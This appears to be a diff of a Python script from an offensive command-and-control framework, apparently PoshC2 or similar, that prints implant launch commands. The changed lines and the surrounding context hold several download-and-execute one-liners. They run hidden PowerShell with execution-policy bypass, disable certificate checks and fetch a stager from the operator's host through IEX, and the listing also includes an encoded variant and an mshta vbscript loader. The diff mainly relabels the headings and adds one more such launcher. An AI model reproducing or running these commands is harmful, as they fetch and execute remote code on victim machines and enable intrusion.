@@ -240,7 +240,7 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
     output_file.close()
 
     print "",Colours.END
-    print "Execution",Colours.GREEN
+    print "Execution via Command Prompt",Colours.GREEN
 
     psuri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_bs"
     pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')" % psuri    
@@ -250,7 +250,11 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
     print "powershell -exec bypass -Noninteractive -windowstyle hidden -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')\"" % psuri
     print ""
     print "powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc
-    print ""
+    print "",Colours.END
+    print "Execution via Powershell",Colours.GREEN
+    print "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')" % psuri
+    print "",Colours.END
+    print "Other Execution Methods",Colours.GREEN
     print "mshta.exe vbscript:GetObject(\"script:%s\")(window.close)" % uri
     print ""
     uri = self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_rg"
